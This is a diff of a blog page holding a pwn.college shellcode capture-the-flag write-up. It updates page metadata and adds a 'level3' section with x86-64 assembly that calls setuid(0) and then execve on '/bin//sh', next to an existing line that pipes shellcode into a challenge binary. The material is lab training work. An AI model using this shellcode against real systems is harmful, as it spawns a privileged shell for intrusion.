@@ -24,7 +24,7 @@
 <meta property="og:description" content="Pwn with pwn.collegeshellcodelevel 1The most basic skills for writing shellcode: Firstly, write down the assemble codes as 1234567891011.global _start_start:.intel_syntax noprefix           mov rax, 5">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-11-07T07:45:04.000Z">
-<meta property="article:modified_time" content="2023-11-07T08:17:12.401Z">
+<meta property="article:modified_time" content="2023-11-30T08:49:55.066Z">
 <meta property="article:author" content="kawa_von">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
@@ -197,7 +197,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.3k 字
+      2.6k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      20 分钟
+      22 分钟
     </span>
   
 
@@ -243,7 +243,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2023年11月7日 下午
+                  本文最后更新于：2023年11月30日 下午
                 
               </p>
             
@@ -285,6 +285,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">cat</span> shellcode-raw ; <span class="hljs-built_in">cat</span>) | ./babyshell_level2<br></code></pre></td></tr></table></figure>
 
 <p>The nop scrolls across the screen quickly from top to bottom, we successfully make it slide over the useless bytes and make the program execute our actual shellcodes.</p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>code:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">.global _start<br>_start:<br>.intel_syntax noprefix<br><br>        mov al, 0x69<br>        xor rdi, rdi<br>        syscall<br><br>           mov al, 59<br>           mov ebx, 0x68732f6e<br>           shl rbx, 8<br>           mov bl, 0x69<br>           shl rbx, 8<br>           mov bl, 0x62<br>           shl rbx, 8<br>           mov bl, 0x2f<br>           push rbx<br>           mov rdi, rsp<br>           xor rsi, rsi<br>           xor rdx, rdx<br>           syscall<br></code></pre></td></tr></table></figure>
+
+<p>more details will be updated later!</p>
 
             </div>
             <hr>
@@ -311,6 +315,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/02/25/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%81%A5%E5%BA%B7%E6%8C%87%E5%8D%97/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">程序员健康指南</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
